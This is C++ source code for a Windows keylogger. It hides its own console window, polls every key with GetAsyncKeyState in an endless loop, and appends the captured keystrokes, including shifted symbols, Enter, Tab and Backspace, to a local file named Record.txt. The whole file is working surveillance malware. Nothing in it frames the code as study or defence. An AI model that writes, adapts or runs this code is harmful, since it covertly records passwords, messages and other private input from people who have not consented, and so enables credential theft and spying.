#include <iostream>
#include <windows.h>
#include <winuser.h>
#include <fstream>

#define PRESSED -32767
#define IS_SHIFT GetAsyncKeyState(0x10)

using namespace std;

void log();
void hide();

int main() {
    hide();
    log();
    return 0;
}

void log() {
    char key;

    while(true) {
        Sleep(0);
        for(key=8; key<=222; key++) {
            if(GetAsyncKeyState(key) == PRESSED) {
                ofstream write("Record.txt", ios::app);

                if(((key > 64) && (key < 91)) && !(IS_SHIFT)) {
                    key += 32;
                    write << key;
                    break;
                } else if(key > 64 && key < 91) {
                    write << key;
                    break;
                } else {
                    switch(key) { // check for symblos
                        case '1': {
                            if(IS_SHIFT)
                                write << "!";
                            else
                                write << "1";

                        } break;

                        case '2': {
                            if(IS_SHIFT)
                                write << "@";
                            else
                                write << "2";
                        } break;

                        case '3': {
                            if(IS_SHIFT)
                                write << "#";
                            else
                                write << "3";
                        } break;

                        case '4': {
                            if(IS_SHIFT)
                                write << "$";
                            else
                                write << "4";
                        } break;

                        case '5': {
                            if(IS_SHIFT)
                                write << "%";
                            else
                                write << "5";
                        } break;

                        case '6': {
                            if(IS_SHIFT)
                                write << "^";
                            else
                                write << "6";
                        } break;

                        case '7': {
                            if(IS_SHIFT)
                                write << "&";
                            else
                                write << "7";
                        } break;

                        case '8': {
                            if(IS_SHIFT)
                                write << "*";
                            else
                                write << "8";
                        } break;

                        case '9': {
                            if(IS_SHIFT)
                                write << "(";
                            else
                                write << "9";
                        } break;

                        case '0': {
                            if(IS_SHIFT)
                                write << ")";
                            else
                                write << "0";
                        } break;

                        case 47: {
                            if(IS_SHIFT)
                                write << "?";
                            else
                                write << "/";
                        } break;

                        case VK_SPACE:
                            write << " ";
                            break;

                        case VK_RETURN:
                            write << "\n";
                            break;

                        case VK_TAB:
                            write << "<Tab>";
                            break;

                        case VK_BACK:
                            write << "<BackSpace>";
                            break;

                        case VK_ESCAPE:
                            write << "<Escape>";
                            break;

                        case VK_DELETE:
                            write << "<Delete>";
                            break;
                    }
                }

                write.close();
            }
        }
    }
}

void hide() {
    HWND stealh;
    AllocConsole();
    stealh = FindWindowA("ConsoleWindowClass",NULL);
    ShowWindow(stealh,0);
}
